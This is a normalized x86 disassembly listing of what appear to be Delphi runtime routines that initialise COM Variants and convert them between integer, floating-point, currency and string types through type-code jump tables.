call sub_40eb14
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40eb14
jmp r-xdata
sub_4119c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40eb14
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411a20
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40eb14
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411a6c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411ac1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f1e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411b1c
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411ac8
lea eax [ ebp - 0x18 ]
call sub_40eeb8
retn
sub_411ad0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4143cc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411b1c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411b38 ]
mov eax ebx
call sub_411904
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a20
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411a20
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411904
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4119c0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411b1c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a20
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411a6c
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e680
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411ad0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411a20
fistp [ esp ]
fwait
mov eax ebx
call sub_411a20
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411d3d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a20
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411a20
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411904
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4119c0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411b1c
fistp [ esp ]
fwait
jmp r-xdata
sub_411ee8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404600
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40eb14
pop ebx
pop ebp
retn 0x8
sub_411f20
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404600
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40eb14
pop ebx
pop ebp
retn 0x8
sub_411f58
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41200e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404600
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40eb14
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412015
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f44
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4041a8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407d40
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40474c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4041a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407d04
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40474c
jmp r-xdata
jmp r-xdata
call sub_40e71c
sub_41201c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4120db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4120b9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40eb14
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404710
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047fc
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4120c0
lea eax [ ebp - 0x10 ]
call sub_40eeb8
retn
sub_4120e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41213e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f1e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4121d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412145
lea eax [ ebp - 0x10 ]
call sub_40eeb8
retn
sub_41214c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4143cc
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4121c1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40eeb8
retn
sub_4121d0
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412707
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412209 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f74
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f20
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f74
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f74
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409498
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f74
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409498
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f74
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411ee8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041a8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411f20
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4041a8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404710
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047fc
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4041a8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_411f58
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4041a8
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f74
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f74
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408140
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f74
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408140
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4121d0
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_41201c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41270e
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f44
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404618
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f44
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404618
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f44
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4120e8
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f74
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f74
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e680
test ah 0x40
je r-xdata
mov eax esi
call sub_403f20
mov edx eax
mov eax ebx
call sub_41214c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_41201c
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f74
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_41201c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f74
jmp r-xdata
jmp [ eax * 4 + jump_table_41249d ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f74
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408054
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409498
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409498
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411ee8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4041a8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_411f20
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4041a8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404148
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411f58
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4041a8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f74
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f74
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408140
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408140
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f74
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4121d0
jmp r-xdata
sub_412714
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4127be
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4127a1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40eb14
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404710
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4127a8
lea eax [ ebp - 0x10 ]
call sub_40eeb8
retn
sub_4127cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412822
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f1e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4128f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412829
lea eax [ ebp - 0x10 ]
call sub_40eeb8
retn
sub_412830
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4128e8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4143cc
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4128ef
lea eax [ ebp - 0x20 ]
call sub_404600
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4128cb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404710
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40eeb8
retn
sub_4128f8
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412e4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412932 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40474c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404600
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40474c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40474c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409498
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40474c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409498
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40474c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411ee8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40463c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411f20
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40463c
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404710
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047fc
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_411f58
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_40463c
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40474c
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40474c
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408054
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40474c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408140
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40474c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408140
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40474c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4128f8
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412714
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40463c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e51
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404618
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f44
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404618
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f44
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404618
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f44
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404618
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f44
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4127cc
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40463c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40474c
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e680
test ah 0x40
je r-xdata
mov eax esi
call sub_404600
mov edx eax
mov eax ebx
call sub_412830
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412714
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40463c
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412714
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40463c
jmp r-xdata
jmp [ eax * 4 + jump_table_412bb9 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40474c
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408054
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40474c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409498
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40474c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409498
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40474c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411ee8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40463c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411f20
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_40463c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404710
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411f58
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_40463c
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40474c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40474c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408054
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40474c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408140
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40474c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408140
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40474c
jmp r-xdata
